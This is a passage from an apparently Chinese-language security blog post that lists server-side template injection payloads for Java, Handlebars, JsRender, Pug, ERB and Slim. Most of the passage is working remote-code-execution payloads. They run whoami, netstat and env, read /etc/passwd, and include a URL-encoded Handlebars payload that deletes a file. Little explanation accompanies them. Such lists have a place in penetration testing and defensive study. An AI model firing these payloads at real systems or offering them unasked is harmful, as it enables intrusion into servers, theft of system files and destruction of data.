</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{{</span><span class="sc">&#39;a&#39;</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">forName</span><span class="p">(</span><span class="err">&#39;</span><span class="n">javax</span><span class="p">.</span><span class="na">script</span><span class="p">.</span><span class="na">ScriptEngineManager</span><span class="err">&#39;</span><span class="p">).</span><span class="na">newInstance</span><span class="p">().</span><span class="na">getEngineByName</span><span class="p">(</span><span class="err">&#39;</span><span class="n">JavaScript</span><span class="err">&#39;</span><span class="p">).</span><span class="na">eval</span><span class="p">(</span><span class="err">\</span><span class="s">&#34;new java.lang.String(&#39;xxx&#39;)\&#34;)}}
</span></span></span><span class="line"><span class="cl"><span class="s">
</span></span></span><span class="line"><span class="cl"><span class="s">{{&#39;a&#39;.getClass().forName(&#39;javax.script.ScriptEngineManager&#39;).newInstance().getEngineByName(&#39;JavaScript&#39;).eval(\&#34;var x=new java.lang.ProcessBuilder; x.command(\\\&#34;whoami\\\&#34;); x.start()\&#34;)}}
</span></span></span><span class="line"><span class="cl"><span class="s">
</span></span></span><span class="line"><span class="cl"><span class="s">{{&#39;a&#39;.getClass().forName(&#39;javax.script.ScriptEngineManager&#39;).newInstance().getEngineByName(&#39;JavaScript&#39;).eval(\&#34;var x=new java.lang.ProcessBuilder; x.command(\\\&#34;netstat\\\&#34;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&#34;)}}
</span></span></span><span class="line"><span class="cl"><span class="s">
</span></span></span><span class="line"><span class="cl"><span class="s">{{&#39;a&#39;.getClass().forName(&#39;javax.script.ScriptEngineManager&#39;).newInstance().getEngineByName(&#39;JavaScript&#39;).eval(\&#34;var x=new java.lang.ProcessBuilder; x.command(\\\&#34;uname\\\&#34;,\\\&#34;-a\\\&#34;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&#34;)}}</span></span></span></code></pre></div><h2 id="4nodejs中的ssti" class="heading-element"><span>4.Nodejs中的SSTI</span>
  <a href="#4nodejs%e4%b8%ad%e7%9a%84ssti" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="1handlebars" class="heading-element"><span>1.Handlebars</span>
  <a href="#1handlebars" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-handlebars" data-lang="handlebars"><span class="line"><span class="cl"><span class="cp">{{</span><span class="k">#with</span> <span class="s2">&#34;s&#34;</span> <span class="nv">as</span> <span class="err">|</span><span class="nv">string</span><span class="err">|</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">  </span><span class="cp">{{</span><span class="k">#with</span> <span class="s2">&#34;e&#34;</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">    </span><span class="cp">{{</span><span class="k">#with</span> <span class="nv">split</span> <span class="nv">as</span> <span class="err">|</span><span class="nv">conslist</span><span class="err">|</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">      </span><span class="cp">{{</span><span class="nv">this.pop</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">      </span><span class="cp">{{</span><span class="nv">this.push</span> <span class="err">(</span><span class="nv">lookup</span> <span class="nv">string.sub</span> <span class="s2">&#34;constructor&#34;</span><span class="err">)</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">      </span><span class="cp">{{</span><span class="nv">this.pop</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">      </span><span class="cp">{{</span><span class="k">#with</span> <span class="nv">string.split</span> <span class="nv">as</span> <span class="err">|</span><span class="nv">codelist</span><span class="err">|</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">        </span><span class="cp">{{</span><span class="nv">this.pop</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">        </span><span class="cp">{{</span><span class="nv">this.push</span> <span class="s2">&#34;return require(&#39;child_process&#39;).exec(&#39;whoami&#39;);&#34;</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">        </span><span class="cp">{{</span><span class="nv">this.pop</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">        </span><span class="cp">{{</span><span class="k">#each</span> <span class="nv">conslist</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">          </span><span class="cp">{{</span><span class="k">#with</span> <span class="err">(</span><span class="nv">string.sub.apply</span> <span class="m">0</span> <span class="nv">codelist</span><span class="err">)</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">            </span><span class="cp">{{</span><span class="nv">this</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">          </span><span class="cp">{{</span><span class="k">/with</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">        </span><span class="cp">{{</span><span class="k">/each</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">      </span><span class="cp">{{</span><span class="k">/with</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">    </span><span class="cp">{{</span><span class="k">/with</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">  </span><span class="cp">{{</span><span class="k">/with</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x"></span><span class="cp">{{</span><span class="k">/with</span><span class="cp">}}</span><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">
</span></span></span><span class="line"><span class="cl"><span class="x">URL编码:
</span></span></span><span class="line"><span class="cl"><span class="x">%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d</span></span></span></code></pre></div><h3 id="2jsrender" class="heading-element"><span>2.JsRender</span>
  <a href="#2jsrender" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">{{</span><span class="o">:%</span><span class="mi">22</span><span class="nx">test</span><span class="o">%</span><span class="mf">22.</span><span class="nx">toString</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">call</span><span class="p">({},</span><span class="o">%</span><span class="mi">22</span><span class="nx">alert</span><span class="p">(</span><span class="o">%</span><span class="mi">27</span><span class="nx">xss</span><span class="o">%</span><span class="mi">27</span><span class="p">)</span><span class="o">%</span><span class="mi">22</span><span class="p">)()}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="o">:</span><span class="s2">&#34;pwnd&#34;</span><span class="p">.</span><span class="nx">toString</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">call</span><span class="p">({},</span><span class="s2">&#34;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /etc/passwd&#39;).toString()&#34;</span><span class="p">)()}}</span></span></span></code></pre></div><h4 id="3pugjs" class="heading-element"><span>3.PugJs</span>
  <a href="#3pugjs" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">//test
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">##</span><span class="p">{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">//rce
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">##</span><span class="p">{</span><span class="kd">function</span><span class="p">(){</span><span class="nx">localLoad</span><span class="o">=</span><span class="nx">global</span><span class="p">.</span><span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">_load</span><span class="p">;</span><span class="nx">sh</span><span class="o">=</span><span class="nx">localLoad</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;touch /tmp/pwned.txt&#39;</span><span class="p">)}()}</span></span></span></code></pre></div><h2 id="5ruby中ssti" class="heading-element"><span>5.Ruby中SSTI</span>
  <a href="#5ruby%e4%b8%adssti" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="1erb" class="heading-element"><span>1.ERB</span>
  <a href="#1erb" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code class="language-erb" data-lang="erb">//test
{{7*7}} = {{7*7}}
${7*7} = ${7*7}
&lt;%= 7*7 %&gt; = 49
&lt;%= foobar %&gt; = Error
//use
&lt;%= system(&#34;whoami&#34;) %&gt; #Execute code
&lt;%= Dir.entries(&#39;/&#39;) %&gt; #List folder
&lt;%= File.open(&#39;/etc/passwd&#39;).read %&gt; #Read file

&lt;%= system(&#39;cat /etc/passwd&#39;) %&gt;
&lt;%= `ls /` %&gt;
&lt;%= IO.popen(&#39;ls /&#39;).readlines()  %&gt;
&lt;% require &#39;open3&#39; %&gt;&lt;% @a,@b,@c,@d=Open3.popen3(&#39;whoami&#39;) %&gt;&lt;%= @b.readline()%&gt;
&lt;% require &#39;open4&#39; %&gt;&lt;% @a,@b,@c,@d=Open4.popen4(&#39;whoami&#39;) %&gt;&lt;%= @c.readline()%&gt;</code></pre><h3 id="2slim" class="heading-element"><span>2.Slim</span>
  <a href="#2slim" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">{</span> <span class="mi">7</span> <span class="o">*</span> <span class="mi">7</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span> <span class="s">%x|env|</span> <span class="p">}</span></span></span></code></pre></div><p>from：</p>
<blockquote>
<p><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/05.SSTI%E6%B3%A8%E5%85%A5/"target="_blank" rel="external nofollow noopener noreferrer">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/05.SSTI%E6%B3%A8%E5%85%A5/</a></p>
<p><a href="https://xz.aliyun.com/t/7518"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/7518</a></p>
<p><a href="https://err0r.top/article/ssti"target="_blank" rel="external nofollow noopener noreferrer">https://err0r.top/article/ssti</a></p></blockquote>
</div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2022-03-29 00:00:00">Updated on 2022-03-29&nbsp;</span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/posts/ssti/" data-title="SSTI Payload记录" data-hashtags="WEB"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/ssti/" data-hashtag="WEB"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/ssti/" data-title="SSTI Payload记录"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/web/" class="post-tag" title="Tags - WEB">WEB</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div><div class="post-nav"><a href="/posts/vulnhub04/" class="post-nav-item" rel="prev" title="VulnHub_04_Holynix: V1"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>VulnHub_04_Holynix: V1</a><a href="/posts/springmvc%E5%88%9D%E6%8E%A2/" class="post-nav-item" rel="next" title="Spring MVC初探">Spring MVC初探<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.145.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.17-8212d6fd"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
              <a href="/"></a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"version":"v0.3.17-8212d6fd"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
</html>
